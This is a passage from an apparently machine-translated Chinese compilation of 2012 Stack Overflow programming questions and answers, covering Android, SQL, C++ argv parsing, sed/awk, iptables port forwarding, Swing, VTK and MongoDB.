*   将 customerId 添加到您的订单表中。

*   将欠款总额以及应付的剩余金额添加到您的订单表中（我假设此金额是基于下订单时鱼的成本；即不受未来鱼价变化的影响）。

*   添加具有 customerId、orderId 并包含已支付和/或到期金额的付款表。使用它来跟踪客户的付款。您可以选择将状态字段添加到订单表，并在完成时将其更新为已付款（或有条件地依赖剩余金额为零）。

# android - 停止 Android 广播接收器

> ID：13599885
> 
> 赞同：0
> 
> 时间：2012-11-28T07:23:29.460
> 
> 标签：android, networking, broadcastreceiver

我在 android 中使用 BroadcastReceiver 类来获取有关网络变化的信息

使用以下代码：

```
 class NetworkStatus extends BroadcastReceiver{    
    ......
    @Override
    public void onReceive(Context context, Intent intent) {
}
       public void startBroadCastReceiver()
{

}

public void  StopBroadCastReceiver()
{
} 
```

我想停止广播接收器，然后重新启动它我该怎么做

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:32:13.490

广播接收器喜欢事件处理程序，当广播与您定义的意图匹配时，Android 系统会自动调用它。如果您在 manifast 文件中定义 boardcast 接收器，我认为唯一可以在您不想处理广播时立即返回的方法，如下所示：

```
public void onReceive(Context context, Intent intent) {
     if (stoppedBroadcast)
          return;

     // handle broadcast.
}

public void stopBroadcast {
     stoppedBroadcast = true;
}

public void resumeBroadcast {
     stoppedBroadcast = false;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:30:40.837

如果您想停止接收网络更改，请尝试在您的注册活动/服务中[取消注册接收器。](http://developer.android.com/reference/android/content/Context.html#unregisterReceiver%28android.content.BroadcastReceiver%29)当您想要启用接收时，再次使用其 IntentFilter 注册接收者。

# c# - 如何从内存中处理字体？

> ID：13599888
> 
> 赞同：1
> 
> 时间：2012-11-28T07:23:36.570
> 
> 标签：c#, privatefontcollection

我正在使用[`PrivateFontCollection`](http://msdn.microsoft.com/en-us/library/system.drawing.text.privatefontcollection.aspx)该类将一些字体动态添加到内存中。

```
_PrivateFontCollection.AddFontFile(string.Format("FontAddress{0}.ttf,_FontName); 
```

我`web browser`在我的win表单应用程序中有一个，对于每个页面我使用一个独特的字体，在显示每个页面之前我将它的页面字体加载到内存中。每种字体都`176KB`从我的内存中获取，所以我想从内存中为预览页面处理加载的字体（例如从我的字体集合中释放字体“P1”）我该怎么做？

# select - SQLPLUS 值问题

> ID：13599891
> 
> 赞同：2
> 
> 时间：2012-11-28T07:23:57.727
> 
> 标签：select, sqlplus

我对 SQL 查询有疑问。

我的任务是显示至少卖到 4 家不同商店的员工的姓名。

我写了以下查询：

```
select EmpCode from Items
group by EmpCode
having COUNT (EmpCode)>=4
order by EmpCode desc; 
```

但我仍然为那些卖给同一家商店的员工获得价值，结果是：

```
EMPCODE
-------
   E4
   E3
   E2
   E1 
```

我知道其他人已经得到了各种其他答案，但最常见的是只返回 1 个值。

该表包含“ItemNo, StoreNo, ItemDesc, Quant, Units, ReorderNo, Price, EmpCode” 该表共有 34 条记录，其中 0 个空值。多名员工向不同的商店出售了多种商品。但完整的表格显示，只有 E3 向**4 家不同的商店** 出售，而其他的则出售给同一家商店、两家商店或三家商店。我想证明 E3 是唯一一个卖给 4 家不同商店的员工。

任何帮助将不胜感激，谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T08:14:22.730

你应该使用`COUNT(DISTINCT StoreNo)`：

```
select EmpCode 
from Items
group by EmpCode
having COUNT (DISTINCT StoreNo)>=4
order by EmpCode desc; 
```

# php - 如何替换 Javascript 数组中的字符串

> ID：13599896
> 
> 赞同：1
> 
> 时间：2012-11-28T07:24:05.587
> 
> 标签：php, javascript, arrays, string, function

我正在尝试通过 Ajax 将 Javascript 数组的值传递给 PHP URL。这是脚本数组

```
<script>"Talent_Percentile.php?"+globalArray"</script> 
```

`globalArray`我的 Javascript 数组在哪里。当我提醒这一点时，我得到

```
Talent_Percentile.php?eqt_param1=4.00,eqt_param2=4.00,eqt_param3=4.00 
```

我知道字符串替换，但我不知道如何在数组上使用它。我需要像这样的输出

```
Talent_Percentile.php?eqt_param1=4.00&eqt_param2=4.00&eqt_param3=4.00 
```

有人能帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:42:38.847

```
var mystring = globalArray.join("&");
var url = "Talent_Percentile.php?" + mystring; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:26:37.643

我建议将您的数组编码为 JSON：

```
<script>
     var url = "Talent_Percentile.php?" + JSON.stringify(globalArray);
</script> 
```

在服务器端，用于[`json_decode`](http://php.net/manual/en/function.json-decode.php)解码数据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:29:09.223

通常，要将函数应用于数组的所有元素，您应该使用[`map`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/map)：

```
globalArray = globalArray.map(function(v) {
    return v.replace("old", "new");
}); 
```

# asp.net - VB.Net通过索引访问数据表行并获取字段值

> ID：13599897
> 
> 赞同：2
> 
> 时间：2012-11-28T07:24:06.777
> 
> 标签：asp.net, vb.net

我想通过索引从数据行中的特定列中获取值，我在访问返回的第二行中的值时遇到问题，下面是我想要实现的

```
 Dim daSeries As New dsSVTableAdapters.clsCH
            Dim dtSeries As New dsSV.SeriesDataTable
            Dim drSeries As dsSV.SeriesRow

            dtSeries = daSeries.CSeries(1)
            drSeries = dtSeries.Rows(0)

            Dim RowCnt As Integer = dtSeries.Rows.Count 'Current RowCnt is 2 

                Select Case RowCnt

                    Case 1 'Only One row exists
                        hxValue1.Value = drSeries.YFieldName 'access 1st row YFieldName
                        hyValue.Value = drSeries.XFieldName  'access 1st row XFieldName
                    Case 2 'Two rows exists
                        For i As Integer = 0 To dtSeries.Rows.Count - 1
                            If i = 0 Then 'First Row index
                                hxValue1.Value = drSeries.YFieldName  'access 1st row YFieldName
                                hyValue.Value = drSeries.XFieldName   'access 1st row XFieldName
                            ElseIf i = 1 Then  '2nd Row index
                                hxValue2.Value = drSeries.YFieldName 'access 2nd row YFieldName
                            End If
                        Next

                End Select 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T08:20:13.200

您的 drSeries 变量始终位于第一行。您应该更改为循环内的第二行

```
Case 2 'Two rows exists
    For i As Integer = 0 To dtSeries.Rows.Count - 1
        ' Simply add this to your loop
        drSeries = dtSeries.Rows(i)

        If i = 0 Then 'First Row index
            hxValue1.Value = drSeries.YFieldName  'access 1st row YFieldName
            hyValue.Value = drSeries.XFieldName   'access 1st row XFieldName
        ElseIf i = 1 Then  '2nd Row index
            hxValue2.Value = drSeries.YFieldName 'access 2nd row YFieldName
        End If
    Next 
```

# c++ - Visual Studio /SUBSYSTEM:POSIX 未出现在 2008 年

> ID：13599909
> 
> 赞同：2
> 
> 时间：2012-11-28T07:25:13.403
> 
> 标签：c++, visual-studio-2008, posix

我已经安装了 Visual Studio 2008 专业版，但我无法在其中一个 Visual C++ 项目中设置 /SUBSYSTEM:POSIX 选项。我还从 SUA 安装了 Visual Studio Debugger 插件，但仍然相同。有关版本信息，请参阅随附的屏幕截图。

![在此处输入图像描述](../Images/483c1fa00d730b59d5bbd753530c9527.png)

谢谢尼拉吉·拉蒂

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-06T10:34:15.593

它消失了。但是，Visual Studio 确实提供了一堆头文件来提供接近（但不一样）的功能，例如[`direct.h`目录操作](http://msdn.microsoft.com/en-us/library/as5kw0ze.aspx)。

目前，在 Windows 上获取 POSIX 的最佳方式可能是[Cygwin 或它的朋友](https://stackoverflow.com/questions/10385424/good-alternatives-to-cygwin-cygwin-doesnt-support-natively-support-win32-app)。

有[适用于 UNIX 的 Windows 服务](https://en.wikipedia.org/wiki/Services_for_UNIX)(SfU)，但[根据一些](http://forums.mozillazine.org/viewtopic.php?f=23&t=47318)人的说法，它与 2006 年的 Cygwin 非常接近。看到 Cygwin 和它的一些同志生活得很好，而 SfU 在五年多的时间里没有看到更新，我会在一周中的任何一天选择前者。

如果您对过去的爆炸感兴趣，请查看[这个 2006 年的小金块，](http://msdn.microsoft.com/en-us/library/y23kc048.aspx)这是 Microsoft 的官方*How to port from UNIX to Windows*网站。微软在 2006 年认为“有用”的东西似乎相当无用，但很有趣。

# ios - UIImgePickerView 横向拍摄的图像在显示时被拉伸

> ID：13599910
> 
> 赞同：0
> 
> 时间：2012-11-28T07:25:13.843
> 
> 标签：ios

在 UIImagePicker 中，用户拍摄照片，然后将照片保存并加载到 tableview 中，现在当图像正常拍摄（纵向）时，它们在图像视图中是完美的尺寸，因为这是我设置它的方式。但是当用户使用横向设备拍摄图像时，图像看起来会倾斜并且看起来非常扭曲。（见图）

上为人像，下为风景

![图片](../Images/42af232caa6e37cbd8a166dcd942c77a.png)

那么有人对如何做到这一点有任何建议吗？任何帮助都会很棒

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:29:24.793

如果它是在横向中拍摄的，那么您将向它显示另一个尺寸宽度 > 高度的框架。或者尝试使用以下代码，看看它是否有所改进。

```
imageViewTemp.clipsToBounds = YES; 
imageViewTemp.contentMode = UIViewContentModeScaleAspectFit; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:32:13.823

UIImageView 拉伸图像以适应其大小。这就是你所看到的。要停止它，您可以更改图像视图的大小，如下所示：

```
CGRect newFrame = CGRectMake(imageView.frame.origin.x,
                             imageView.frame.origin.y,
                             image.size.width,
                             image.size.height);
imageView.frame = newFrame; 
```

# uiscrollview - 在 UIScrollView 内的 UIImageView 中缩放和平移

> ID：13599912
> 
> 赞同：2
> 
> 时间：2012-11-28T07:25:24.850
> 
> 标签：uiscrollview, uiimageview, uigesturerecognizer

我有一个用 UIImageView 填充的 UIScrollView。UIScrollView 启用分页以让用户“翻转”这些图像。每个 UIImageView 都有用于缩放缩放的 UIPinchGestureRecognizer 和用于在放大时平移该图像的 UIPanGestureRecognizer。
您可能已经注意到，我想要实现的就像 iBooks 在其应用程序中所做的一样。

但是，我很难完成这项工作。

在我的“BookPageViewController”中，我设置了 UIScrollView，然后根据来自 sqlite 的数据（页码、文件名等）用文件夹中的图像填充它们。

```
_pageScrollView = [[UIScrollView alloc] initWithFrame:CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height)];

NSUInteger pageCount = [pages count];

for (int i = 0; i < pageCount; i++) {

    CGFloat x = i * self.view.frame.size.width;

    // Page Settings
    UIImageView *pageView = [[UIImageView alloc] initWithFrame:CGRectMake(x, 0, self.view.frame.size.width, self.view.frame.size.height)];

    pageView.backgroundColor = [UIColor greenColor];
    pageView.image = [pages objectAtIndex:i];
    pageView.userInteractionEnabled = YES;
    pageView.tag = i;

    // Gesture Reocgnisers
    UIPinchGestureRecognizer *pinchGr = [[UIPinchGestureRecognizer alloc] initWithTarget:self action:@selector(pinchImage:)];
    pinchGr.delegate = self;
    [pageView addGestureRecognizer:pinchGr];

    UIPanGestureRecognizer *panGr = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(panImage:)];
    [pageView addGestureRecognizer:panGr];

    // Finally add this page to the ScrollView
    [_pageScrollView addSubview:pageView];
}  

_pageScrollView.contentSize = CGSizeMake(self.view.frame.size.width * pageCount, self.view.frame.size.height);
_pageScrollView.pagingEnabled = YES;
_pageScrollView.delegate = self;

[self.view addSubview:_pageScrollView]; 
```

在 Stackoverflow 中另一个好问题的帮助下，我提出了这些问题：

```
- (void) pinchImage:(UIPinchGestureRecognizer*)pgr {

  [self adjustAnchorPointForGestureRecognizer:pgr];

  if ([pgr state] == UIGestureRecognizerStateBegan || [pgr state] == UIGestureRecognizerStateChanged) {
    if ([pgr scale]) {
        NSLog(@"SCALE: %f", [pgr scale]);
        [pgr view].transform = CGAffineTransformScale([[pgr view] transform], [pgr scale], [pgr scale]);
        [pgr setScale:1];
    } else {
        NSLog(@"[PAMPHLET PAGE]: The image cannot be scaled.");
    }
  }
} 
```

我的问题是，当我使用 Pinch Gesture 放大 UIImageView 之一时，图像超过（越过）到下一个图像并隐藏它。我相信应该有办法“限制”放大/缩小和 UIImageView 的大小（不是 UIImage 本身），但我不知道从这里去哪里。我还放了一个代码来限制规模，例如：

```
([pgr scale] > 1.0f && [pgr scale] < 1.014719) || ([pgr scale] < 1.0f && [pgr scale] > 0.98f) 
```

但它没有用......

我知道这对 ios 专业人士来说并不难，但我对 Objective-c 还是很陌生，这是我第一次开发真正的应用程序。如果这不是一个好的做法，我也想知道任何想法来实现如何像 ibooks 那样做到这一点（例如，将 UIImageView 放在 UIScrollView 中，然后将 UIScrollView 放到另一个 UIScrollView 中）......

对不起，另一个初学者问题，但我真的需要帮助。
提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-25T11:45:38.320

如果不亲自尝试，我的第一个猜测是 UIImageView 上的变换也会变换它的框架。解决这个问题的一种方法是将 UIImageView 放在另一个 UIView 中，然后将该 UIView 放在 UIScrollView 中。您的手势识别器和转换仍将在 UIImageView 上。确保 UIView 的 clipsToBounds 属性设置为 YES。

# c++ - 在 C++ 中使用 if/then 语句解析 argv[ ] 选项

> ID：13599915
> 
> 赞同：3
> 
> 时间：2012-11-28T07:25:32.530
> 
> 标签：c++, if-statement, argv

在输入选项/参数时，您将如何使用使用 argv[] 的 if/then 语句？

例如，*a.out -d 1 sample.txt*与*a.out -e 1 sample.txt*。

```
int main (int argc, char *argv[])
{
  ifstream infile(argv[3]);

  int c;
  int number = 0;
  int count = 0;

  while ( infile.good() ) {

            if (argv[1] == "-d")
            {

                 c = infile.get();

                 number = atoi(argv[2]);  

                  if (number == count)
                 {
                 cout.put(c);
                 count = 0;
                 }

                      else
                        count++;

            }       

           if (argv[1] == "-e")
           { 
              cout << "entered -e" << endl;   //testing code
           }

  }//end while

}//end main 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T07:29:32.003

您不能使用相等运算符来比较 C 风格的字符串，您必须使用[`std::strcmp`](http://en.cppreference.com/w/cpp/string/byte/strcmp)：

```
if (std::strcmp(argv[1], "-d") == 0) 
```

其背后的原因是`==`运算符比较*指针*而不是它们指向的内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:43:25.500

我希望您要检查输入参数**-d**或**-e**，对吗？如果是这种情况，请使用 strcmp()

if (!strcmp(argv[1],"-d")) {

```
 count++;
            printf("\ncount=%d",count);

        }       

       if (!strcmp(argv[1],"-e"))
       { 
          printf("entered -e");   //testing code
       } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T07:54:12.660

第一个错误在第一行`main`：

```
ifstream infile(argv[3]); 
```

你不能这样写，因为*没有第三个论点*。当你像这样调用你的程序时：

```
a.out -d 1 < sample.txt 
```

那么程序看到的命令行如下所示：

```
argv[0] = "a.out"
argv[1] = "-d"
argv[2] = "1" 
```

相比之下，`< sample.txt`shell 直接解释 ，并且文件被流式传输到程序的标准输入 - 在程序内部，您无法更改它。

至于解析本身，不要*在*读取文件的循环中执行，在之前执行并设置适当的标志。

对于实际的解析，我建议使用库来减轻您的痛苦。标准的 Unix 工具是[`getopt`](https://www.gnu.org/software/libc/manual/html_node/Getopt.html)，但它只有一个 C 接口。有几个 C++ 库，其中[Boost.Program_Options](http://www.boost.org/doc/libs/1_52_0/doc/html/program_options.html)对我来说有点太复杂了。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-28T09:10:03.027

argc/argv 来自 C 语言，使用起来相当麻烦，因此当完成基本参数传递之外，您可以将参数转换为字符串向量并以 C++ 风格工作：

```
#include <iostream>
#include <vector>
#include <algorithm>
#include <iterator>

main(int argc, char* argv[])
{
  std::vector<std::string> args;
  std::transform(argv+1, argv+argc, std::back_inserter(args), [](char* arg){ return std::string(arg); });

  if (args.at(1) == "-d") { std::cout << "Arg 1 = -d" << "\n"; }

  for (auto& arg: args) { std::cout << "arg: " << arg << "\n"; }
} 
```

不过，您需要检查参数是否存在。如果这是一个基本工具，并且当参数不存在时工具中止是可以接受的，那么您可以使用`args.at(x)`而不是访问 args 元素`args[x]`

或者检查[这个 SO question](https://stackoverflow.com/questions/253556/what-parameter-parser-libraries-are-there-for-c)以获得参数解析器。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T07:30:28.320

char *argv[] 是一个 char * 数组* 所以

```
 if (string(argv[1]) == "-d") 
```

# sed - 在行间插入单词

> ID：13599916
> 
> 赞同：1
> 
> 时间：2012-11-28T07:25:40.787
> 
> 标签：sed

我有数千行的 pdb（蛋白质数据库）文件。

```
REMARK   1                     PDB file generated by ptraj (set  1000)
ATOM      1  O22 DDM     1       2.800   4.419  20.868  0.00  0.00
ATOM      2  H22 DDM     1       3.427   4.096  20.216  0.00  0.00
ATOM      3  C22 DDM     1       3.351   5.588  21.698  0.00  0.00
ATOM      4  H42 DDM     1       3.456   5.274  22.736  0.00  0.00
ATOM      5  C23 DDM     1       2.530   6.846  21.639  0.00  0.00
ATOM      6  H43 DDM     1       2.347   7.159  20.611  0.00  0.00
ATOM      7  O23 DDM     1       1.313   6.498  22.334  0.00  0.00
ATOM      8  H23 DDM     1       0.903   5.837  21.771  0.00  0.00
ATOM      9  C24 DDM     1       3.073   8.109  22.266  0.00  0.00
ATOM     10  H44 DDM     1       3.139   7.837  23.319  0.00  0.00
ATOM     11  O24 DDM     1       2.218   9.278  22.007  0.00  0.00
ATOM     12  H24 DDM     1       1.278   9.184  22.179  0.00  0.00
ATOM     13  C25 DDM     1       4.494   8.317  21.764  0.00  0.00
ATOM     14  H45 DDM     1       4.391   8.452  20.687  0.00  0.00 
```

'

我想在该文件中每 81 行插入单词“TER”，其中包含超过 20,000 行但忽略第一行，因为它是注释。

我通过互联网浏览，似乎 SED 可以做到。但我迷路了。

任何人都可以指导吗？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:30:16.897

试试这个：

```
sed -i -e '1~81 i\TER' file 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:38:12.137

我偏爱`awk`自己：

```
 awk '{if(FNR%81==0)print "TER"; print}' file 
```

我发现这比`sed`同类产品更容易理解和调试。唯一的魔力是`FNR`行号

您可能不得不摆弄 中的数字`if`才能完全按照您想要的方式获得它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T16:36:55.167

更详细的 shell 命令将是

```
{
    read header
    echo "$header"
    i=0
    while read line; do
        echo "$line"
        if (( ++i == 81 )); then
            echo TER
            i=0
        fi
    done
} < infile > outfile &&
mv outfile infile 
```

# ubuntu - 如何将 mylocal:2700 映射到 mylocal:80？

> ID：13599928
> 
> 赞同：0
> 
> 时间：2012-11-28T07:26:39.283
> 
> 标签：ubuntu, apache2, webserver, port

我想通过浏览器中的*mylocal:2700*访问我的本地 Web 服务器*mylocal:80*。怎么能不费吹灰之力就实现呢？问题是我正在使用外部应用程序 api，并且该应用程序需要*mylocal:2700*作为其来源。我们在几台机器上工作，其中一台机器的本地服务器是*mylocal:2700*。我不能改变那个。所以我正在改变所有其他机器。我们正在使用 apache 和 ubuntu。

 **** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:29:09.900

```
iptables -t nat -A PREROUTING -p tcp --dport 27000 -j REDIRECT --to-port 80 
```***

# swing - 没有 JMenuBar 的下拉菜单

> ID：13599929
> 
> 赞同：2
> 
> 时间：2012-11-28T07:26:43.603
> 
> 标签：swing, button, drop-down-menu, popupmenu, jmenubar

有没有办法在 Java 中实现下拉按钮，但没有实现`JMenuBar`？我需要导入一个带有弹出菜单的按钮。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-04-28T08:22:55.003

![在此处输入图像描述](../Images/6f2e9653e274b30591c8384ec028fc32.png)

```
 import java.awt.event.ActionEvent;
    import java.awt.event.ActionListener;

    import javax.swing.JPopupMenu;
    import javax.swing.JToggleButton;
    import javax.swing.event.PopupMenuEvent;
    import javax.swing.event.PopupMenuListener;

    public class MenuButton extends JToggleButton {

        JPopupMenu popup;

        public MenuButton(String name, JPopupMenu menu) {
            super(name);
            this.popup = menu;
            addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent ev) {
                    JToggleButton b = MenuButton.this;
                    if (b.isSelected()) {
                        popup.show(b, 0, b.getBounds().height);
                    } else {
                        popup.setVisible(false);
                    }
                }
            });
            popup.addPopupMenuListener(new PopupMenuListener() {
                @Override
                public void popupMenuWillBecomeVisible(PopupMenuEvent e) {}
                @Override
                public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {
                    MenuButton.this.setSelected(false);
                }
                @Override
                public void popupMenuCanceled(PopupMenuEvent e) {}
            });
        }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-03T22:24:11.380

正如@DavidKroukamp 所说，JPopupMenu 应该可以解决问题。

# ios - 如何使 BlockAlertsAnd-ActionSheets ARC 兼容？

> ID：13599933
> 
> 赞同：-1
> 
> 时间：2012-11-28T07:27:05.507
> 
> 标签：ios, ios6

我在 Cocoa Controls 中遇到了这个有益的 UIAlerts。

[https://github.com/gpambrozio/BlockAlertsAnd-ActionSheets](https://github.com/gpambrozio/BlockAlertsAnd-ActionSheets)

在我实施安装后，它似乎还不兼容 ARC。

有人想出这个吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:30:59.930

您可以通过为这些文件添加 -fno-objc-arc 编译器标志来禁用单个文件的 ARC。请在[此处](https://stackoverflow.com/questions/6646052/how-can-i-disable-arc-for-a-single-file-in-a-project)检查问题。

# c++ - 如何将多个 vtkprop 或 vtkactor 组合成一个更大的 actor 或 prop？

> ID：13599941
> 
> 赞同：1
> 
> 时间：2012-11-28T07:27:20.633
> 
> 标签：c++, opengl, vtk

我正在开发一个 qt/vtk 应用程序，用户可以根据他的要求绘制大量的 vtk 演员/道具。现在需要提供一种功能来组合所有绘制的演员/道具以形成母演员/道具。我试过 vtkactorcollection ，但它分别存储所有演员。提供任何合适的示例或将我指向相关帖子。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T07:51:35.740

我猜你正在寻找一个 vtkAssembly：[http ://www.vtk.org/doc/release/5.0/html/a01164.html](http://www.vtk.org/doc/release/5.0/html/a01164.html)

遗憾的是，提供的示例仅是 TCL/Py，因此您最好的选择是此处给出的交互器示例：[http ://www.vtk.org/Wiki/VTK/Examples/Cxx/Interaction/Assembly](http://www.vtk.org/Wiki/VTK/Examples/Cxx/Interaction/Assembly)

**但是**：这仍然将原始演员保存在某个地方并且速度很慢，您可以通过 vtkAssembly 的转换进行转换，但它并不是快速的核心。这完全取决于你想做什么。也许您可以丢弃所有参与者并简单地合并多数据？ [http://www.cmake.org/Wiki/VTK/Examples/Cxx/Filtering/CombinePolydata](http://www.cmake.org/Wiki/VTK/Examples/Cxx/Filtering/CombinePolydata)

编辑：对于绘制的东西[http://www.vtk.org/Wiki/VTK/Examples/Cxx/Filtering/AppendFilter](http://www.vtk.org/Wiki/VTK/Examples/Cxx/Filtering/AppendFilter)也可以很好地工作（比组合多边形数据过滤器快一点）

尽管我不想阻止使用 stackoverflow，但对于 vtk 问题来说，vtk 邮件列表要好得多，因为所有 vtk 资深人士都在附近徘徊并为几乎所有要求提供最佳实践。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-04-10T06:27:29.327

```
void Widget::loadObjModel() {
    QElapsedTimer t;
    t.start();
    auto renderer = vtkSmartPointer<vtkRenderer>::New();
    auto renWin = vtkSmartPointer<vtkRenderWindow>::New();
    renWin->AddRenderer(renderer);
    auto importer = vtkSmartPointer<vtkOBJImporter>::New();
    importer->SetRenderWindow(renWin);

    importer->SetFileName("E:/Garden/Garden.obj");
    importer->SetFileNameMTL("E:/Garden/Garden.mtl");
    importer->SetTexturePath("E:/Garden");
    importer->Update();

    auto actors = renderer->GetActors();
    actors->InitTraversal();

    auto assembly = vtkSmartPointer<vtkAssembly>::New();
    qDebug() << "There are " << actors->GetNumberOfItems() << " actors";
    for (vtkIdType a = 0; a < actors->GetNumberOfItems(); ++a) {
        vtkActor *actor = actors->GetNextActor();
        assembly->AddPart(actor);
    }
    assembly->RotateX(90);

    m_renderer->AddActor(assembly);

} 
```

# php - 删除mongo中嵌套元素的索引

> ID：13599943
> 
> 赞同：0
> 
> 时间：2012-11-28T07:27:27.817
> 
> 标签：php, mongodb

我在 mongoDb 中有一个集合。它类似于以下内容。

```
array(
    '_id' => new MongoId("50b35d1217ce10ac1000000f")
    'Education' => 
      array (
        'content' => 
        array (
          '0' => 
          array (
            'Organization' => 'SUST',
            'Degree' => 'BSC',
            'Department' => '',
            'Location' => 'Dhaka',
            'Session' => '2 Years',
          ),
          '1' => 
          array (
            'Organization' => 'DU',
            'Degree' => 'BSC',
            'Department' => '',
            'Location' => 'Dhaka',
            'Session' => '2 Years',
          )    
        ),
        'sharing' => 'public',
      ),
) 
```

我想从集合中删除 Education.content.1。所以我用

```
update(array('_id' => new MongoId('50b35d1217ce10ac1000000f')), array('$unset' => array('Education.content.1' => 1))); 
```

结果 Education.content.1 变为空。但我希望 Education.content.1 被删除不为空。

如果有人知道解决方案，请帮助我。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:35:14.770

使用`$pull`后`$unset`：

```
update(array('_id' => new MongoId('50b35d1217ce10ac1000000f')), 
array('$unset' => array('Education.content.1' => 1)));
update(array('_id' => new MongoId('50b35d1217ce10ac1000000f')), 
array('$pull' => array('Education.content' => null))); 
```

# sql - 根据在表中找到索引的次数，显示哪些产品卖得更好的 SQL 查询？

> ID：13599947
> 
> 赞同：0
> 
> 时间：2012-11-28T07:27:48.683
> 
> 标签：sql, oracle

我有包含产品和数量的客户表，我需要检索那些在公司卖得更好的产品。

我将如何使用 SQL 查询来完成此任务？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:32:31.337

我认为一个简单的 order by 子句应该做

```
select products, quantity
from tableName
order by quantity desc 
```

例如，如果您只需要前 5 名，请在上述查询中的 select 和 products 词之间添加“前 5 名”

希望有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:33:10.110

出于产品/订单/销售表模式的共同假设，构造了以下查询。因此，请向我们展示您的表格或根据您的表格更改查询。

这将为您提供最好的产品：

```
SELECT s.ProductID, ProductName, Max(s.Quantity) as MaxSales
FROM Products p, SalesOrder s
WHERE p.ProductID = s.ProductID
GROUP BY s.ProductID; 
```

这将为您提供 10 种最佳产品：

```
SELECT TOP 10 s.ProductID, ProductName, s.Quantity
FROM Products p, SalesOrder s
WHERE p.ProductID = s.ProductID
ORDER BY s.Quantity DESC; 
```

# android - Android sqlite调用项目

> ID：13599951
> 
> 赞同：1
> 
> 时间：2012-11-28T07:28:12.160
> 
> 标签：android, sqlite, phone-call

我无法从我的数据库 sqlite 拨打电话。请告诉我该怎么做？当我选择列出此活动时，它不能拨打号码。数据库已创建，但电话号码未激活，请帮助我。这是我的项目：

```
public class HospitalP extends ListActivity {

private String[] dataTempat = null;

DatabaseHandler db = new DatabaseHandler(this);

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // setContentView(R.layout.tampilphone);

    Log.d("Insert: ", "Inserting ..");
    db.addContact(new Contact("RUMAH SAKIT JOGJA INTERNATIONAL HOSPITAL",
            "02744463535"));
    db.addContact(new Contact("RUMAH SAKIT Dr SARDJITO", "0274587333"));
    db.addContact(new Contact("RUMAH SAKIT BETHESDA", "0274562246"));
    db.addContact(new Contact("RUMAH SAKIT UMUM PKU MUHAMADIYAH",
            "0274512653"));
    db.addContact(new Contact("RUMAH SAKIT ISLAM HIDAYATULAH", "0274389194"));
    db.addContact(new Contact("RUMAH SAKIT UMUM DAERAH KOTA YOGYAKARTA",
            "0274371195"));
    db.addContact(new Contact("BALAI PENGOBATAN PARU PARU", "0274374722"));
    db.addContact(new Contact("CITRA MEDIKA", "0274387775"));
    db.addContact(new Contact(
            "RUMAH SAKIT ANGKUTAN UDARA Dr S HARDJOLUKITO", "0274564467"));
    db.addContact(new Contact("RUMAH SAKIT BAKTI IBU", "0274383008"));
    db.addContact(new Contact("RUMAH SAKIT SAKINA IDAMAN", "0274582039"));
    db.addContact(new Contact("RUMAH SAKIT DKT", "0274555402"));
    db.addContact(new Contact("RUMAH SAKIT IBU DAN ANAK PURA IBUNDA",
            "0274514784"));
    db.addContact(new Contact("RUMAH SAKIT ISLAM AT TUROTS AL ISLAMI",
            "0274793823"));
    db.addContact(new Contact("RUMAH SAKIT KHUSUS ANAK EMPAT LIMA",
            "0274376962"));
    db.addContact(new Contact("RUMAH SAKIT KHUSUS BEDAH SOEDIRMAN",
            "0274589090"));
    db.addContact(new Contact("RUMAH SAKIT KHUSUS PURI NIRMALA",
            "0274515255"));
    db.addContact(new Contact("RUMAH SAKIT LUDIRA HUSADA TAMA",
            "0274620373"));
    db.addContact(new Contact("RUMAH SAKIT MATA DOKTER YAP", "0274584423"));
    db.addContact(new Contact("RUMAH SAKIT PATMASURI", "0274418007"));
    db.addContact(new Contact("RUMAH SAKIT PERMATA BUNDA", "0274376092"));

    Log.d("Reading: ", "Reading all contacts..");
    List<Contact> contacts = db.getAllContacts();

    dataTempat = new String[contacts.size()];
    int i = 0;
    for (Contact cn : contacts) {
        String log = "Id: " + cn.getID() + " ,Name: " + cn.getName()
                + " ,Phone: " + cn.getPhoneNumber();
        Log.d("Name: ", log);
        dataTempat[i] = cn.getName();
        i++;

    }
    ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
            android.R.layout.simple_list_item_1, dataTempat);
    setListAdapter(adapter);
}

@Override
public void onListItemClick(ListView l, View v, int position, long id) {
    super.onListItemClick(l, v, position, id);

